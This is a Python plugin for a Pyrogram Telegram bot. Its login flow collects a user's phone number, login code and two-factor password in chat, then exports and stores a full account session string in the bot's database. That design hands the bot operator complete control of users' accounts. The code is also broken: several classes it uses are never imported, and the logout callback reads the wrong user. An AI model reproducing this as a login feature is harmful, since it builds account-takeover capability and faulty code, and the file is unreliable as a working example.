import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram import enums
from config import API_ID, API_HASH
from database.db import db

LOGIN_STATE = {}
cancel_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("❌ Cancel")]],
    resize_keyboard=True
)
remove_keyboard = ReplyKeyboardRemove()
PROGRESS_STEPS = {
    "WAITING_PHONE": "🟢 Phone Number → 🔵 Code → 🔵 Password",
    "WAITING_CODE": "✅ Phone Number → 🟢 Code → 🔵 Password",
    "WAITING_PASSWORD": "✅ Phone Number → ✅ Code → 🟢 Password"
}
LOADING_FRAMES = [
    "🔄 Connecting •••",
    "🔄 Connecting ••○",
    "🔄 Connecting •○○",
    "🔄 Connecting ○○○",
    "🔄 Connecting ○○•",
    "🔄 Connecting ○••",
    "🔄 Connecting •••"
]

async def animate_loading(message: Message, duration: int = 5):
    for _ in range(duration):
        for frame in LOADING_FRAMES:
            try:
                await message.edit_text(f"<b>{frame}</b>", parse_mode=enums.ParseMode.HTML)
                await asyncio.sleep(0.5)
            except:
                return

@Client.on_message(filters.private & filters.command("login"))
async def login_start(client: Client, message: Message):
    user_id = message.from_user.id
   
    user_data = await db.get_session(user_id)
    if user_data:
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("🚪 Logout First", callback_data="logout_confirm")]])
        return await message.reply(
            "<b>✅ You're already logged in! 🎉</b>\n\n"
            "To switch accounts, first use /logout.",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=buttons
        )
    
    LOGIN_STATE[user_id] = {"step": "WAITING_PHONE", "data": {}}
   
    progress = PROGRESS_STEPS["WAITING_PHONE"]
    await message.reply(
        f"<b>👋 Hey! Let's log you in smoothly 🌟</b>\n\n"
        f"<i>Progress: {progress}</i>\n\n"
        "Please send your phone number (e.g., +1234567890).",
        reply_markup=cancel_keyboard,
        parse_mode=enums.ParseMode.HTML
    )

@Client.on_message(filters.private & filters.command("logout"))
async def logout(client: Client, message: Message):
    user_id = message.from_user.id
    session = await db.get_session(user_id)
    if not session:
        return await message.reply("<b>❌ You are not logged in.</b>", parse_mode=enums.ParseMode.HTML)
    
    await db.set_session(user_id, None)
    await message.reply("<b>✅ Logged out successfully! 🚪</b>\n\n<i>Use /login to log in again.</i>", parse_mode=enums.ParseMode.HTML)

@Client.on_message(filters.private & filters.text)
async def login_handler(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if text == "❌ Cancel":
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
        return await message.reply("<b>❌ Login cancelled.</b>", reply_markup=remove_keyboard, parse_mode=enums.ParseMode.HTML)
    
    if user_id not in LOGIN_STATE:
        return
    
    state = LOGIN_STATE[user_id]
    step = state["step"]
    progress = PROGRESS_STEPS[step]
    
    if step == "WAITING_PHONE":
        phone = text
        temp_client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone,
            in_memory=True
        )
        state["data"]["client"] = temp_client
        state["step"] = "WAITING_CODE"
        
        status_msg = await message.reply(
            f"<b>📱 Sending code to {phone}... 📱</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
        
        try:
            await temp_client.connect()
            sent_code = await temp_client.send_code(phone)
            state["data"]["phone_code_hash"] = sent_code.phone_code_hash
            animation_task.cancel()
            await status_msg.edit(
                f"<b>✅ Code sent! Enter the code you received.</b>\n\n<i>Progress: {PROGRESS_STEPS['WAITING_CODE']}</i>",
                parse_mode=enums.ParseMode.HTML
            )
        except PhoneNumberInvalid:
            animation_task.cancel()
            await status_msg.edit("<b>❌ Invalid phone number. Try again.</b>", parse_mode=enums.ParseMode.HTML)
            del LOGIN_STATE[user_id]
        except ApiIdInvalid:
            animation_task.cancel()
            await status_msg.edit("<b>❌ Invalid API ID/Hash. Contact admin.</b>", parse_mode=enums.ParseMode.HTML)
            del LOGIN_STATE[user_id]
        except Exception as e:
            animation_task.cancel()
            await status_msg.edit(f"<b>❌ Error: {e}</b>", parse_mode=enums.ParseMode.HTML)
            del LOGIN_STATE[user_id]
    
    elif step == "WAITING_CODE":
        code = text
        temp_client = state["data"]["client"]
        phone_code_hash = state["data"]["phone_code_hash"]
        
        status_msg = await message.reply(
            f"<b>🔢 Verifying code... 🔢</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
        
        try:
            await temp_client.sign_in(phone_code_hash=phone_code_hash, phone_code=code)
            animation_task.cancel()
            await finalize_login(status_msg, temp_client, user_id)
        except PhoneCodeInvalid:
            animation_task.cancel()
            await status_msg.edit("<b>❌ Invalid code. Try again.</b>", parse_mode=enums.ParseMode.HTML)
        except PhoneCodeExpired:
            animation_task.cancel()
            await status_msg.edit("<b>❌ Code expired. Restart /login.</b>", parse_mode=enums.ParseMode.HTML)
            del LOGIN_STATE[user_id]
        except SessionPasswordNeeded:
            animation_task.cancel()
            state["step"] = "WAITING_PASSWORD"
            await status_msg.edit(
                f"<b>🔒 2FA detected. Enter your password.</b>\n\n<i>Progress: {PROGRESS_STEPS['WAITING_PASSWORD']}</i>",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            await status_msg.edit(f"<b>❌ Error: {e}</b>", parse_mode=enums.ParseMode.HTML)
            del LOGIN_STATE[user_id]
    
    elif step == "WAITING_PASSWORD":
        password = text
        temp_client = state["data"]["client"]
        
        status_msg = await message.reply(
            f"<b>🔑 Checking password... 🔑</b>\n\n<i>Progress: {progress}</i>",
            parse_mode=enums.ParseMode.HTML
        )
        animation_task = asyncio.create_task(animate_loading(status_msg, duration=3))
        
        try:
            await temp_client.check_password(password=password)
            animation_task.cancel()
            await finalize_login(status_msg, temp_client, user_id)
        except PasswordHashInvalid:
            animation_task.cancel()
            await status_msg.edit(
                "<b>❌ Incorrect password. 🔑</b>\n\n"
                f"<i>Progress: {progress}</i>\n\nPlease try again.",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            animation_task.cancel()
            await status_msg.edit(
                f"<b>❌ Something went wrong: {e} 🤔</b>\n\n<i>Progress: {progress}</i>",
                parse_mode=enums.ParseMode.HTML
            )
            await temp_client.disconnect()
            del LOGIN_STATE[user_id]

async def finalize_login(status_msg: Message, temp_client, user_id):
    try:
        session_string = await temp_client.export_session_string()
        await temp_client.disconnect()
       
        await db.set_session(user_id, session=session_string)
       
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]
           
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Home", callback_data="start_btn")]])
        await status_msg.edit(
            "<b>🎉 Login Successful! 🌟</b>\n\n"
            "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
            "<i>Your session has been saved securely. 🔒</i>\n\n"
            "You can now use all features! 🚀",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=buttons
        )
    except Exception as e:
        await status_msg.edit(
            f"<b>❌ Failed to save session: {e} 😔</b>\n\nPlease try /login again.",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=remove_keyboard
        )
        if user_id in LOGIN_STATE:
            del LOGIN_STATE[user_id]

@Client.on_callback_query(filters.regex("logout_confirm"))
async def logout_confirm(client: Client, callback_query: CallbackQuery):
    await callback_query.answer("Logging out...")
    await logout(client, callback_query.message)
